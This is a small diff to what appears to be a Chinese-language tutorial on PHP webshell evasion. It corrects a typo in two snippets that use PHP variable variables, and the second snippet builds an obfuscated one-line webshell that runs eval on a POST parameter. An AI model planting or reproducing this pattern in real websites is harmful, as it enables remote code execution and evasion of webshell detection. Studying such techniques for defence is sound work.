@@ -897,7 +897,7 @@ array_map($user,$user = $pass );
 
 ```php
 $f = 'hello';    //变量名为f，变量值为Hello
-$$z = 'AabyssZG';  //变量名为Hello（也就是$f的值），值为AabyssZG
+$$f = 'AabyssZG';  //变量名为Hello（也就是$f的值），值为AabyssZG
 echo $hello;     //输出AabyssZG
 ```
 
@@ -905,7 +905,7 @@ echo $hello;     //输出AabyssZG
 
 ```php
 $f ='hello';
-$$z = $_POST['aabyss'];
+$$f = $_POST['aabyss'];
 eval($hello);   //eval($_POST['aabyss']); 
 ```
 
